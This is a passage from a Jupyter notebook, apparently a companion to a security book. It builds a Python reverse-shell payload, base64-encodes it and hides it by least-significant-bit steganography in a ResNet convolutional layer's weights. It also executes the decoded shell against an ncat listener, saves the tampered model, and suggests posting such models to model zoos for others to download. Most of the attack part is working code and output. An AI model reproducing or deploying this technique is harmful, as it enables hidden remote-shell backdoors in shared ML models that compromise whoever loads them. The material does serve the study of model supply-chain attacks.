    "In the book, we discussed the importance of byte order. As a reminder, if you are wondering why byte ordering matters, think about the following value of 257. 1 byte can hold up to 256 values or 0 to 255. Hence the need for the second byte for 257. Let's however, use 32 bits or 4 bytes to represent the integer. This is only because we want to get comfortable with working with these 32bit values. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "id": "bd8f6ba0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x00\\x00\\x01\\x01'"
      ]
     },
     "execution_count": 79,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# First looking at 257 from the Big Endian or Network Byte Order perspective\n",
    "# Notice the *>* than sign\n",
    "struct.pack('>I', 257)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "7624e2c1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x01\\x01\\x00\\x00'"
      ]
     },
     "execution_count": 80,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now the same two bytes in Little Endian\n",
    "# Notice the *<* than sign\n",
    "struct.pack('<I', 257)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "43d015b6",
   "metadata": {},
   "source": [
    "Above shows the four bytes changes direction. With that understanding in place, let us move ahead.   \n",
    "\n",
    "With the data converted to integers, let's set up our payload. For simplicity (as always), let's also ensure our payload length does not go beyond 255.   \n",
    "\n",
    "There are some great payloads on this site: **https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python**  that we can use. However, I wanted to make this more interesting through encoding it. You can even go further an encrypt this if you wish. Once we decide to encode it becomes longer than 255 bytes. Rather than encoding it, we could use it as is but what fun is that. :-) \n",
    "\n",
    "There is one primary reason why we want to ensure that our size is less than 255. As we saw above with the number 257, we will require at least two bytes. By staying with a max size of 255, this ensures we can store our length within one byte without any issues. This also means, we know we will need to scan the first 8 bytes to recover these 8 bits.   \n",
    "\n",
    "If you are wondering why I said scan 8 bytes to recover the 8 bits, remember, we are only targeting the least significant bit. Hence, one byte only will have content in the least significant bit.  \n",
    "\n",
    "### Step 3:   \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "5bff94c3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your payload is: \n",
      "b'python -c \\'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"127.0.0.1\",9999));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")\\'&'\n",
      "It has length: 188 bytes long\n"
     ]
    }
   ],
   "source": [
    "#This Python payload creates a reverse shell\n",
    "payload = b\"\"\"python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"127.0.0.1\",9999));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'&\"\"\"\n",
    "\n",
    "payload_len = len(payload)\n",
    "print(f'Your payload is: \\n{payload}')\n",
    "print(f'It has length: {payload_len} bytes long')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bdffcc8f",
   "metadata": {},
   "source": [
    "We have our payload and length. Let us go ahead and make things more interesting. We will use base64 encoding. As stated earlier, you can even add encryption if you wanted to make this more interesting. Even go further and add integrity checking also. :-D ;-) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "id": "50fa7003",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your base64 encoded input:\n",
      "b'cHl0aG9uIC1jICdhPV9faW1wb3J0X187cz1hKCJzb2NrZXQiKTtvPWEoIm9zIikuZHVwMjtwPWEoInB0eSIpLnNwYXduO2M9cy5zb2NrZXQocy5BRl9JTkVULHMuU09DS19TVFJFQU0pO2MuY29ubmVjdCgoIjEyNy4wLjAuMSIsOTk5OSkpO2Y9Yy5maWxlbm87byhmKCksMCk7byhmKCksMSk7byhmKCksMik7cCgiL2Jpbi9zaCIpJyY='\n",
      "The length of the encoded payload is: 252\n"
     ]
    }
   ],
   "source": [
    "# Base64 encode the data\n",
    "payload_b64_encoded = base64.b64encode(payload)\n",
    "print(f'Your base64 encoded input:\\n{payload_b64_encoded}')\n",
    "print(f'The length of the encoded payload is: {len(payload_b64_encoded)}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "32c05cf8",
   "metadata": {},
   "source": [
    "With the payload encoded, we want to now represent each of these characters, rather than the entire sequence as its ASCII representation. For this, we will encode the data with data type 8-bit unsigned int and leverage the np.frombuffer.   \n",
    "\n",
    "Each of those number is associated with a character. See: https://man7.org/linux/man-pages/man7/ascii.7.html  for the character mapping.   \n",
    "\n",
    "For example, our first character is c, this maps to decimal 99. Which is what we see as the first item in the vector. The second character is H, that value is 72 in decimal. You should be able to figure out the rest from here. \n",
    "\n",
    "### Step 4:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "81f94d1f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ 99  72 108  48  97  71  57 117  73  67  49 106  73  67 100 104  80  86\n",
      "  57 102  97  87  49 119  98  51  74  48  88  49  56  55  99 122  49 104\n",
      "  75  67  74 122  98  50  78 114  90  88  81 105  75  84 116 118  80  87\n",
      "  69 111  73 109  57 122  73 105 107 117  90  72  86 119  77 106 116 119\n",
      "  80  87  69 111  73 110  66  48 101  83  73 112  76 110  78 119  89  88\n",
      " 100 117  79  50  77  57  99 121  53 122  98  50  78 114  90  88  81 111\n",
      "  99 121  53  66  82 108  57  74  84 107  86  85  76  72  77 117  85  48\n",
      "  57  68  83  49  57  84  86  70  74  70  81  85  48 112  79  50  77 117\n",
      "  89  50  57 117  98 109  86 106 100  67 103 111  73 106  69 121  78 121\n",
      "  52 119  76 106  65 117  77  83  73 115  79  84 107  53  79  83 107 112\n",
      "  79  50  89  57  89 121  53 109  97  87 120 108  98 109  56  55  98 121\n",
      " 104 109  75  67 107 115  77  67 107  55  98 121 104 109  75  67 107 115\n",
      "  77  83 107  55  98 121 104 109  75  67 107 115  77 105 107  55  99  67\n",
      " 103 105  76  50  74 112  98 105  57 122  97  67  73 112  74 121  89  61]\n"
     ]
    }
   ],
   "source": [
    "# Get the payload as 8 bits unsigned int\n",
    "payload_encoded = np.frombuffer(payload_b64_encoded, dtype=np.uint8)\n",
    "\n",
    "print(payload_encoded)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "1c670398",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Payload vector length is: 252\n"
     ]
    }
   ],
   "source": [
    "# Get the length of the payload \n",
    "payload_len = payload_encoded.shape[0]\n",
    "print(f'Payload vector length is: {payload_len}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "092aae8c",
   "metadata": {},
   "source": [
    "The 252 returned above should not surprise you as this was also the length of the base64 encoded content above. This should also confirm for you that all we did, was to map each character to its decimal representation. \n",
    "\n",
    "With this in place, we could leave things here and start moving on to hiding our data. However, let's store this length as the first item in the vector containing our revers_shell payload. This ensures we know how many bytes to read and where to stop.  \n",
    "\n",
    "What will happen also, is when we prepend the length to our encoded data, the vector will take on the int64 data type, rather than retaining the np.uint8. We will need to force the array back to np.uint8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "id": "9b4c3efe",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The current date type is: int64\n",
      "The new date type is: uint8\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([252,  99,  72, 108,  48,  97,  71,  57, 117,  73,  67,  49, 106,\n",
       "        73,  67, 100, 104,  80,  86,  57, 102,  97,  87,  49, 119,  98,\n",
       "        51,  74,  48,  88,  49,  56,  55,  99, 122,  49, 104,  75,  67,\n",
       "        74, 122,  98,  50,  78, 114,  90,  88,  81, 105,  75,  84, 116,\n",
       "       118,  80,  87,  69, 111,  73, 109,  57, 122,  73, 105, 107, 117,\n",
       "        90,  72,  86, 119,  77, 106, 116, 119,  80,  87,  69, 111,  73,\n",
       "       110,  66,  48, 101,  83,  73, 112,  76, 110,  78, 119,  89,  88,\n",
       "       100, 117,  79,  50,  77,  57,  99, 121,  53, 122,  98,  50,  78,\n",
       "       114,  90,  88,  81, 111,  99, 121,  53,  66,  82, 108,  57,  74,\n",
       "        84, 107,  86,  85,  76,  72,  77, 117,  85,  48,  57,  68,  83,\n",
       "        49,  57,  84,  86,  70,  74,  70,  81,  85,  48, 112,  79,  50,\n",
       "        77, 117,  89,  50,  57, 117,  98, 109,  86, 106, 100,  67, 103,\n",
       "       111,  73, 106,  69, 121,  78, 121,  52, 119,  76, 106,  65, 117,\n",
       "        77,  83,  73, 115,  79,  84, 107,  53,  79,  83, 107, 112,  79,\n",
       "        50,  89,  57,  89, 121,  53, 109,  97,  87, 120, 108,  98, 109,\n",
       "        56,  55,  98, 121, 104, 109,  75,  67, 107, 115,  77,  67, 107,\n",
       "        55,  98, 121, 104, 109,  75,  67, 107, 115,  77,  83, 107,  55,\n",
       "        98, 121, 104, 109,  75,  67, 107, 115,  77, 105, 107,  55,  99,\n",
       "        67, 103, 105,  76,  50,  74, 112,  98, 105,  57, 122,  97,  67,\n",
       "        73, 112,  74, 121,  89,  61], dtype=uint8)"
      ]
     },
     "execution_count": 85,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Append the length and encoded bytes\n",
    "encoded_data_w_len = np.r_[[payload_len], payload_encoded]\n",
    "print(f'The current date type is: {encoded_data_w_len.dtype}')\n",
    "\n",
    "# Forcing it back to np.uint8\n",
    "encoded_data_w_len = np.array(encoded_data_w_len, dtype=np.uint8)\n",
    "print(f'The new date type is: {encoded_data_w_len.dtype}')\n",
    "\n",
    "# View the payload\n",
    "encoded_data_w_len"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1d1fa0a3",
   "metadata": {},
   "source": [
    "We have gotten our encoded content as integers. However, remember, we need to get these values as bits, as we are manipulating the least significant bit. Hence, we need to break these numbers down to their binary representation.  \n",
    "\n",
    "We also need to keep in mind, these bits will influence the number of bytes we need. \n",
    "\n",
    "### Step 5:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "id": "2f1c0f85",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of bytes needed for encoding is: 2024\n",
      "[1 1 1 ... 1 0 1]\n"
     ]
    }
   ],
   "source": [
    "# Now get the raw bits\n",
    "encoded_bits = np.unpackbits(encoded_data_w_len)\n",
    "print(f'The number of bytes needed for encoding is: {len(encoded_bits)}')\n",
    "print(encoded_bits)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "85ddff9b",
   "metadata": {},
   "source": [
    "Before moving forward, let's ensure we can recover this data from the binary  format it is currently in.  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "id": "fc7a27af",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sample from recovered bits: ['1', '1', '1', '1', '1', '1', '0', '0']\n"
     ]
    }
   ],
   "source": [
    "# Let us first convert the bits to string\n",
    "# We will then join them\n",
    "# At the same time, this is being made into a list to keep it a bit cleaner\n",
    "\n",
    "recovered_bits = encoded_bits.astype(str).tolist()\n",
    "print(f'Sample from recovered bits: {recovered_bits[:8]}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "id": "f577d50c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sample from recovered bits: [['1', '1', '1', '1', '1', '1', '0', '0'], ['0', '1', '1', '0', '0', '0', '1', '1'], ['0', '1', '0', '0', '1', '0', '0', '0'], ['0', '1', '1', '0', '1', '1', '0', '0'], ['0', '0', '1', '1', '0', '0', '0', '0']]\n"
     ]
    }
   ],
   "source": [
    "# Here we see we have groups of 8 bits \n",
    "recovered_bits = [ recovered_bits[i : i+8 ] for i in range(0, len(recovered_bits), 8)]\n",
    "print(f'Sample from recovered bits: {recovered_bits[:5]}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7b32fc31",
   "metadata": {},
   "source": [
    "What we end up with above, is a list of lists. Each of these lists contain 8 bits, which covers a byte each. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "id": "8cbb5adc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sample from recovered bits: ['11111100', '01100011', '01001000', '01101100', '00110000']\n"
     ]
    }
   ],
   "source": [
    "# Time to join each of those individual list to get back the binary representation\n",
    "recovered_bits = [ ''.join(i) for i in recovered_bits ]\n",
    "print(f'Sample from recovered bits: {recovered_bits[:5]}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "id": "8ca48c4f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The recovered length is: 252\n"
     ]
    }
   ],
   "source": [
    "# Extracting the first item at index 0 as this should be our length\n",
    "# We got 252 above, and 252 below ...\n",
    "print(f'The recovered length is: {int(recovered_bits[0], base=2)}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a6bef8a4",
   "metadata": {},
   "source": [
    "This suggests so far we are able to recover the rest of the items.   \n",
    "\n",
    "- First extract all fields except the first in the recovered_bits. \n",
    "- We already know the first field contains the length which was used above.   \n",
    "- Next, take the base 2 values and convert them to their integer representations\n",
    "- Use 'chr' to convert these values to their ascii character representation\n",
    "- Finally join them all together to recover the base 64 encoded content   \n",
    "\n",
    "### Step 6:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "id": "76481cf0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'cHl0aG9uIC1jICdhPV9faW1wb3J0X187cz1hKCJzb2NrZXQiKTtvPWEoIm9zIikuZHVwMjtwPWEoInB0eSIpLnNwYXduO2M9cy5zb2NrZXQocy5BRl9JTkVULHMuU09DS19TVFJFQU0pO2MuY29ubmVjdCgoIjEyNy4wLjAuMSIsOTk5OSkpO2Y9Yy5maWxlbm87byhmKCksMCk7byhmKCksMSk7byhmKCksMik7cCgiL2Jpbi9zaCIpJyY='"
      ]
     },
     "execution_count": 91,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Recover the base64 encoded content\n",
    "tmp_b64 = ''.join([ chr(int(i, base=2)) for i in recovered_bits[1:] ])\n",
    "tmp_b64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "id": "d8ffd7b1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'python -c \\'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"127.0.0.1\",9999));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")\\'&'"
      ]
     },
     "execution_count": 92,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Decode the data above\n",
    "# Below shows we are good to go. \n",
    "# We have the full python string back, which represents our reverse shell\n",
    "base64.b64decode(tmp_b64)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "69de9f48",
   "metadata": {},
   "source": [
    "#### Setup a listener to verify this works  \n",
    "You should have **ncat** installed on your machine. If it is not, install it via your favourite package manager.\n",
    "\n",
    "Setup the listener. \n",
    "$ **ncat --verbose --listen 9999**   \n",
    "\n",
    "With ncat running, you should see something like:  \n",
    "Ncat: Version 7.94SVN ( https://nmap.org/ncat )   \n",
    "Ncat: Listening on [::]:9999   \n",
    "Ncat: Listening on 0.0.0.0:9999   \n",
    "\n",
    "### Step 7:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "id": "7244e8a8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 93,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Validate that we can run the command\n",
    "os.system(command=base64.b64decode(tmp_b64))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aceb4dd5",
   "metadata": {},
   "source": [
    "At this point, above should be successful and you should see something such as below on your screen.     \n",
    "\n",
    "$ ncat --verbose --listen 9999   \n",
    "\n",
    "With ncat running, you should see something like:  \n",
    "Ncat: Version 7.94SVN ( https://nmap.org/ncat )   \n",
    "Ncat: Listening on [::]:9999   \n",
    "Ncat: Listening on 0.0.0.0:9999   \n",
    "\n",
    "At this point a connection should have come into your system   \n",
    "**Ncat: Connection from 127.0.0.1:56916.**   \n",
    "\n",
    "This shows you have gained a shell on the system \n",
    "**$**  \n",
    "\n",
    "This confirms you have access:  \n",
    "$ **whoami**   \n",
    "whoami   \n",
    "securitynik   \n",
    "\n",
    "With all of this in place, let's now get to prepare our data for leveraging the LSB   \n",
    "\n",
    "Continuing with regular programming ... pun intended ;-)    \n",
    "Earlier we got the integer values of the float and were able to convert the integer back to float.   \n",
    "One reason for taking that approach, was to be able to identify if the integer value is even or odd.    \n",
    "\n",
    "\n",
    "### Step 8:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "id": "41ff5653",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[2 3 4 5 6]\n",
      "Modulo of 2 against a is: [0 1 0 1 0]\n"
     ]
    }
   ],
   "source": [
    "# For example, assuming we have the following numpy array, stored in variable a\n",
    "\n",
    "a = np.array([2,3,4,5,6])\n",
    "print(a)\n",
    "\n",
    "# If we find the modulo 2 of it, the values 3 and 5 will have a remainder of 1 and everything else will be 0\n",
    "# This is because, when we divide the values by 2, \n",
    "# the numbers 2, 4 and 6 will have 0 remainder, while 3 and 5 will have remainder of 1\n",
    "\n",
    "print(f'Modulo of 2 against a is: {a % 2}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "id": "f72529cb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([2, 2, 4, 4, 6])"
      ]
     },
     "execution_count": 95,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# What we want, is minus this from the original value \n",
    "# This gives us everything as even.\n",
    "a -= a % 2\n",
    "a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "id": "ebb76bc1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([2, 3, 5, 4, 6])"
      ]
     },
     "execution_count": 96,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now we can add or bits from our payload\n",
    "# Let's assume we have payload as b\n",
    "b = np.array([0, 1, 1, 0, 0])\n",
    "a + b"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6b80ed1b",
   "metadata": {},
   "source": [
    "From above, we can see we have back our original values. We wish to have something similar done with our original convolutional layer, which was extracted from the model.   \n",
    "\n",
    "Let us first remind ourselves of what the flattened convolutional layer looks like.   \n",
    "\n",
    "### Step 9:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "id": "f72bbc36",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ 0.00016218 -0.01471994 -0.01699994 ... -0.00128763  0.00139736\n",
      "  0.01343372]\n"
     ]
    }
   ],
   "source": [
    "# This is our convolutional layer flattened. \n",
    "print(conv_layer_flat)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "id": "134c370c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Remember, the size of the encoded_bits is: 2024\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([  959057717, -1133433880, -1131723915, -1135441611, -1123580813,\n",
       "       -1122622227,  1021564562,  1016130577, -1130988661,  1009548822],\n",
       "      dtype=int32)"
      ]
     },
     "execution_count": 98,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We cannot just append these converted values to the tensor\n",
    "# The tensor is float32 and we need to have some integers to work with in the short term\n",
    "\n",
    "# Let us create an empty array\n",
    "bytes_manipulated = np.array([], dtype=np.int32)\n",
    "\n",
    "# Create a loop to manipulate each of the values in the flattened layer above\n",
    "# We are \n",
    "print(f'Remember, the size of the encoded_bits is: {encoded_bits.size}')\n",
    "for i in range(encoded_bits.size):\n",
    "    # Uncomment this line if you want an additional view of the output\n",
    "    # print(struct.unpack('@i', struct.pack('@f', conv_layer_flat[i]))[0])\n",
    "\n",
    "    # Cycle through each item in the flattened vector and \n",
    "    # append them to the empty array we created above\n",
    "    bytes_manipulated = np.append(bytes_manipulated, struct.unpack('@i', struct.pack('@f', conv_layer_flat[i]))[0]).astype(np.int32)\n",
    "\n",
    "bytes_manipulated[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "id": "d95f63e0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(array([0, 1], dtype=int32), array([1010, 1014]))"
      ]
     },
     "execution_count": 99,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Just for our own sanity\n",
    "np.unique(bytes_manipulated % 2, return_counts=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "439a15e9",
   "metadata": {},
   "source": [
    "We are heading in the right direction.  \n",
    "\n",
    "What we have done is where our payload has even, we keep the value and where it is odd, increase the value.   \n",
    "\n",
    "The least significant bit is what we use to increase by that 1   \n",
    "\n",
    "With that detour, let's prepare to wrap-up the encoding   \n",
    "\n",
    "### Step 10:  \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "id": "60d9d2d3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([  959057716, -1133433880, -1131723916, -1135441612, -1123580814,\n",
       "       -1122622228,  1021564562,  1016130576, -1130988662,  1009548822],\n",
       "      dtype=int32)"
      ]
     },
     "execution_count": 100,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Take the bytes manipulated and minus the modulo 2 from it. \n",
    "bytesRounded = bytes_manipulated -  bytes_manipulated % 2\n",
    "\n",
    "# Looking at the first 10 values\n",
    "# We see the odd numbers have been decreased by 1 \n",
    "# while the even numbers remain the same,  \n",
    "\n",
    "bytesRounded[:10]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "23b4b01b",
   "metadata": {},
   "source": [
    "And the moment we have all been waiting for ...  \n",
    "\n",
    "Time to finally inject our data into the least significant bit of the weights in the conv2 layer.\n",
    "\n",
    "### Step 11:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "id": "eaff0ac5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([  959057717, -1133433879, -1131723915, -1135441611, -1123580813,\n",
       "       -1122622227,  1021564562,  1016130576, -1130988662,  1009548823],\n",
       "      dtype=int32)"
      ]
     },
     "execution_count": 101,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Performing the LSB manipulation\n",
    "encoded_data = bytesRounded + encoded_bits\n",
    "\n",
    "# Peaking at the first 10 samples\n",
    "encoded_data[:10]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6b29f5dc",
   "metadata": {},
   "source": [
    "Putting the data back in its float form, as is expected by the model layer  \n",
    "Create a float array to get this data back as a float values   \n",
    "\n",
    "### Step 12:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "id": "a8871506",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([ 0.00016218, -0.01471994, -0.01699994, ..., -0.03539636,\n",
       "       -0.01025628, -0.03842575], dtype=float32)"
      ]
     },
     "execution_count": 102,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Like we did before, setup a temp array\n",
    "tmp_float = np.array([])\n",
    "for idx, value in enumerate(encoded_data):\n",
    "    #print(struct.unpack('@f', struct.pack('@i', value))[0])\n",
    "\n",
    "    # Moving back from the integer to the float values in the layer\n",
    "    tmp_float = np.append(tmp_float, struct.unpack('@f', struct.pack('@i', value))[0]).astype(np.float32)\n",
    "\n",
    "tmp_float"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "464d92aa",
   "metadata": {},
   "source": [
    "Above should already seem encouraging to you, as the numbers should look very similar to our original values. We can confirm this by:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "id": "7f6b61b4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([ 0.00016218, -0.01471994, -0.01699994, ..., -0.00128763,\n",
       "        0.00139736,  0.01343372], dtype=float32)"
      ]
     },
     "execution_count": 103,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Looking at the conv layer to confirm similarity\n",
    "conv_layer_flat"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "id": "a7df53f1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "np.False_"
      ]
     },
     "execution_count": 104,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# When we test to see if the values are the same we see false\n",
    "(tmp_float == conv_layer_flat[:len(tmp_float)]).all()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "id": "ebb10364",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 105,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# however, when we check to see if they are all close\n",
    "# We see they are\n",
    "# Except for some precision issue, we these numbers would be very close to each other.\n",
    "np.allclose(tmp_float, conv_layer_flat[:len(tmp_float)])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8a256eaf",
   "metadata": {},
   "source": [
    "Time to update the original tensor   \n",
    "\n",
    "### Step 13:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "id": "40aaa409",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The original flattend tensor for the conv2d layer has: **2359296** elements\n"
     ]
    }
   ],
   "source": [
    "print(f'The original flattend tensor for the conv2d layer has: **{conv_layer_flat.shape[0]}** elements')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "id": "7a853003",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([ 0.00016218, -0.01471994, -0.01699994, ..., -0.00128763,\n",
       "        0.00139736,  0.01343372], dtype=float32)"
      ]
     },
     "execution_count": 107,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We need to only update as much as we have items in the tmp_float above\n",
    "# Everything else, will retain their original values\n",
    "conv_layer_flat[:tmp_float.size] = tmp_float\n",
    "conv_layer_flat\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "id": "e476cfec",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Shape of conv2d layer before reshaping: (2359296,)\n",
      "Shape of conv2d has: 1 dimensions\n",
      "Shape of conv2d layer after reshaping: torch.Size([512, 512, 3, 3])\n",
      "Shape of conv2d has: 4 dimensions\n"
     ]
    }
   ],
   "source": [
    "# Now to reshape the data back to its original shape\n",
    "print(f'Shape of conv2d layer before reshaping: {conv_layer_flat.shape}')\n",
    "print(f'Shape of conv2d has: {conv_layer_flat.ndim} dimensions')\n",
    "\n",
    "conv_layer = conv_layer_flat.reshape(conv_layer_shape)\n",
    "\n",
    "# Convert this layer back to a tensor\n",
    "conv_layer = torch.as_tensor(data=conv_layer, dtype=torch.float32)\n",
    "\n",
    "print(f'Shape of conv2d layer after reshaping: {conv_layer.shape}')\n",
    "print(f'Shape of conv2d has: {conv_layer.ndim} dimensions')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "id": "f6030778",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Update the model with this new information \n",
    "model.layer4[0].conv2.weight.data = conv_layer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "id": "80a99497",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor(107)"
      ]
     },
     "execution_count": 110,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Confirm the model can still make predictions\n",
    "# Looks like we were able to get the same prediction as above.\n",
    "model(sample).argmax()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e84a363a",
   "metadata": {},
   "source": [
    "Looks like the above worked as expected.   \n",
    "Let's save the model   \n",
    "\n",
    "### Step 14:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "id": "e8e9a103",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/model_stegoed.pt\n"
     ]
    }
   ],
   "source": [
    "# Saving the model  \n",
    "torch.save(obj=model, f=r'/tmp/model_stegoed.pt')\n",
    "\n",
    "# Verify the file has been saved\n",
    "!ls /tmp/model_stegoed.pt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "05b2369a",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "047e10b4",
   "metadata": {},
   "source": [
    "### Decoding our content  \n",
    "For this we need a separate script, tool, etc. \n",
    "First, let's get out saved model. This is basically the same anyone else would do. Remember, in the book we spoke about these model zoos. So there is nothing stopping us from creating a model, storing it on one of these sites and promoting it for someone else to download.   \n",
    "\n",
    "### Step 15:   "
   ]
  },
